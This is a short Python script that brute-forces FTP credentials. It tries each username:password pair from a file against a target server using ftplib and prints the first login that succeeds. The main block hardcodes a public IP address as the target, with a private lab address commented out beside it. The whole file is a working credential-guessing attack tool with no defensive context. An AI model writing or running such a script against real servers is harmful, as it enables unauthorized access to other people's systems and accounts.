#!/usr/bin/env python
# coding=utf-8
import ftplib
import time


def brute_login(hostname, passwd_file):
    with open(passwd_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')

            print(f'[+] Trying: {username}/{password}')

            try:
                ftp.login(username, password)
                print(f'\n[*] {str(hostname)} FTP Login Succeeded.'
                      f'{username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                print(f'[-] Exception: {e}')
                pass

        print(f'\b[-] Could not brute force FTP credentials.')
        return None, None


if __name__ == '__main__':
#    tgt_host = '192.168.59.179'
    tgt_host = '114.214.205.205'
    pass_file = 'userpass.txt'
    brute_login(tgt_host, pass_file)
